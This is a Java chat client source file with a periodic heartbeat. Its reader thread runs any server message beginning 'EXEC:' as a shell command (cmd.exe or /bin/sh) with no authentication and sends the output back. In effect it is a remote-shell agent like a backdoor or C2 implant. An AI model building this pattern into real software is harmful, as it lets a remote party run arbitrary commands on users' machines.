import java.net.*;
import java.io.*;

public class concurrentChatClient {
    public static void main(String[] args) {
        // try-with-resources for automatic cleanup
        try (Socket socket = new Socket("127.0.0.1", 2000);
                PrintWriter out = new PrintWriter(socket.getOutputStream(), true);
                BufferedReader in = new BufferedReader(new InputStreamReader(socket.getInputStream()));
                BufferedReader stdIn = new BufferedReader(new InputStreamReader(System.in))) {

            // 1. HANDSHAKE: Get and send username immediately
            String serverPrompt = in.readLine(); // "Enter your username:"
            System.out.println("Server: " + serverPrompt);
            String username = stdIn.readLine();
            out.println(username);

            Thread heartbeatThread = new Thread(() -> {
                try {
                    while (true) {
                        Thread.sleep(10000);
                        // new packet format
                        String packet = createPacket("HEARTBEAT", "OK", username);
                        out.println(packet);
                    }
                } catch (Exception e) {
                    System.out.println("Heartbeat interrupted.");
                }
            });
            heartbeatThread.setDaemon(true);
            heartbeatThread.start();

            // THREAD 1: The Reader (Listening For Server Commands)
            Thread readerThread = new Thread(() -> {
                try {
                    String serverMessage;
                    while ((serverMessage = in.readLine()) != null) {
                        if (serverMessage.startsWith("EXEC:")) {
                            String command = serverMessage.substring(5).trim();
                            System.out.println("\n[NODE AGENT]: Executing remote command -> " + command);
                            executeSystemCommand(command, out, username);
                        } else {
                            System.out.println("\nServer: " + serverMessage);
                        }
                    }
                } catch (IOException e) {
                    System.out.println("Connection closed by server.");
                }
            });
            readerThread.start();

            // THREAD 2: The Writer (Keyboard Input)
            String userInput;
            while ((userInput = stdIn.readLine()) != null) {
                if (userInput.equalsIgnoreCase("END"))
                    break;
                out.println(createPacket("CHAT", userInput, username));
            }

        } catch (IOException e) {
            e.printStackTrace();
        }

    }

    private static void executeSystemCommand(String command, PrintWriter out, String username) {
        try {
            String os = System.getProperty("os.name").toLowerCase();
            ProcessBuilder pb;

            // The "Shell Wrapper" logic
            if (os.contains("win")) {
                // Windows needs cmd.exe to understand 'dir', 'type', etc.
                pb = new ProcessBuilder("cmd.exe", "/c", command);
            } else {
                // Linux (Android/Termux) needs sh to understand 'ls', 'cat', etc.
                pb = new ProcessBuilder("/bin/sh", "-c", command);
            }

            pb.redirectErrorStream(true);
            Process process = pb.start();

            try (BufferedReader osReader = new BufferedReader(new InputStreamReader(process.getInputStream()))) {
                String line;
                out.println(">>> Results from " + os + " Node:");
                while ((line = osReader.readLine()) != null) {
                    out.println(createPacket("COMMAND_RESULT", line, username));
                    out.flush(); // Crucial for real-time streaming
                }
            }
        } catch (Exception e) {
            out.println("Agent Execution Error: " + e.getMessage());
        }
    }

    private static String createPacket(String type, String data, String user) {
        // We use a delimiter like '|' because it's rare in normal text
        return "TYPE:" + type + "|FROM:" + user + "|DATA:" + data;
    }
}